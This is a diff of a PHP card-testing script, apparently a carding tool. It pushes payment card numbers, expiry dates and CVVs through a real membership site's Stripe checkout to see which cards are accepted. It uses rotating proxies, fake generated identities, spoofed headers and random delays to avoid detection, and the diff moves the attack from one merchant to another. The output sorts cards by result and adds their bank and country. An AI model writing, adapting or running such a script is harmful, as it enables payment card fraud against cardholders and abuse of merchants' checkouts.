@@ -2,6 +2,11 @@
 // File path to cookie.txt
 $cookieFilePath = 'cookie.txt';
 
+// Check if the file exists and delete it
+//if (file_exists($cookieFilePath)) {
+  //  unlink($cookieFilePath);
+//}
+
 error_reporting(0);
 date_default_timezone_set('Asia/Jakarta');
 
@@ -106,13 +111,13 @@ $city = $data['results'][0]['location']['city'];
 $street = $data['results'][0]['location']['street']['name'];
 
 // Optional: simulate user delay
- sleep(rand(1, 3)); 
+
   // Pause to simulate a break in user action
 
 
 // Step 1: Fetch the page to get the nonce value
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://provideme.io/membership-account/membership-checkout-2/');
+curl_setopt($ch, CURLOPT_URL, 'https://learnhowtosign.com/membership-account-2/membership-checkout/?level=3');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -152,9 +157,9 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
 
 // Insert simulated delay before posting form data
- sleep(rand(1, 3)); // A longer delay to simulate a pause before submission
+ sleep(rand(1, 2)); // A longer delay to simulate a pause before submission
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=cfaed93d-4b66-4a41-ad34-fe9d85613de5785366&muid=413fd995-efee-4627-92dd-c67260375761d7a25a&sid=e62483c3-698b-4c78-8368-6cc85cc8ff7ae4cb1c&pasted_fields=number&payment_user_agent=stripe.js%2F0f795842d4%3B+stripe-js-v3%2F0f795842d4%3B+split-card-element&referrer=https%3A%2F%2Fprovideme.io&time_on_page=102837&client_attribution_metadata[client_session_id]=b69e5a38-ea3a-46ba-9393-87930c31db68&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1PHEaRP9XqsP2YSY');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=606ebe40-ddc0-464d-a0d8-19d7bb8d9a779bd404&muid=15d0d1d7-6985-4cf3-84bb-09d84ad78947643869&sid=a29e17ff-960c-4c7f-aeca-c14b06dffbe53b73d3&pasted_fields=number&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+split-card-element&referrer=https%3A%2F%2Flearnhowtosign.com&time_on_page=34447&client_attribution_metadata[client_session_id]=3d3fa535-02a7-4670-822c-aa8e398466b7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1HgVsjFW89inDxd6');
 
 // Continue with the rest of the code
 $result1 = curl_exec($ch);
@@ -163,7 +168,7 @@ curl_close($ch);
 $proxy = rebootproxys();
 list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://provideme.io/membership-account/membership-checkout-2/');
+curl_setopt($ch, CURLOPT_URL, 'https://learnhowtosign.com/membership-account-2/membership-checkout/?level=3');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -177,8 +182,8 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-    'origin: https://provideme.io',
-    'referer: https://provideme.io/membership-account/membership-checkout-2/',
+    'origin: https://learnhowtosign.com',
+    'referer: https://learnhowtosign.com/membership-account-2/membership-checkout/?level=3',
     'sec-fetch-dest: document',
     'sec-fetch-mode: navigate',
     'sec-fetch-site: same-origin',
@@ -186,7 +191,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'x-requested-with: XMLHttpRequest',
 ));
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'pmpro_level=1&checkjavascript=1&pmpro_other_discount_code=&username='.$rnd.'111&password='.$firstname.'002%401&password2='.$firstname.'002%401&bemail='.$firstname.'3'.$rnd.'0%40gmail.com&bconfirmemail='.$firstname.'3'.$rnd.'0%40gmail.com&fullname=&CardType=visa&pmpro_discount_code=&tos=1&pmpro_checkout_nonce='.$nonce.'&_wp_http_referer=%2Fmembership-account%2Fmembership-checkout-2%2F&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'pmpro_level=3&level=3&checkjavascript=1&username='.$firstname.'nxt'.$zip.'1&bemail='.$firstname.''.$rnd.''.$zip.'01'.$lastname.'%40gmail.com&bconfirmemail_copy=1&password='.$lastname.'99007%40&password2='.$lastname.'99007%40&first_name='.$firstname.'&last_name='.$lastname.'&fullname=&student_name=&gateway=stripe&CardType=visa&pmpro_discount_code=&submit-checkout=1&javascriptok=1&javascriptok=1&submit-checkout=1&javascriptok=1&javascriptok=1&pmpro_other_discount_code=&pmpro_checkout_nonce='.$nonce.'&_wp_http_referer=%2Fmembership-account-2%2Fmembership-checkout%2F%3Flevel%3D3&payment_method_id='.$id.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
 $result2 = curl_exec($ch);
 $cvc_check = trim(strip_tags(GetStr($result2, '"cvc_check":"', '"')));
 $info = curl_getinfo($ch);
@@ -470,17 +475,7 @@ elseif (strpos($result2, 'Invalid account.')) {
           </div><br>";
 }
 
-elseif (strpos($result2, 'Nonce security check failed.')) {
-    echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
-            Reprovada ❌ $cc|$mes|$ano|$cvv
-          </div><br>
-          <div style='background-color: rgba(255, 69, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 69, 0, 0.7);'>
-            Nonce Security Check Failed! Please Wait or Retry !! ➝➝ 🙤𝐌𝐇𝐈𝐓𝐙𝐗𝐆🙧
-          </div><br>
-          <div style='background-color: rgba(0, 0, 139, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(0, 0, 139, 0.7);'>
-            $bank [$country] - $type
-          </div><br>";
-}
+
 elseif (strpos($result2, 'Your card was declined.')) {
     echo "<div style='background-color: rgba(255, 0, 0, 0.8); padding: 10px; border-radius: 5px; color: white; display: inline-block; box-shadow: 0px 0px 10px 2px rgba(255, 0, 0, 0.7);'>
             Reprovada ❌ $cc|$mes|$ano|$cvv
@@ -726,8 +721,3 @@ flush();
 //echo "<b>2REQ Result:</b> $result2<br><br>";
 
 ?>
-
-
-
-
-
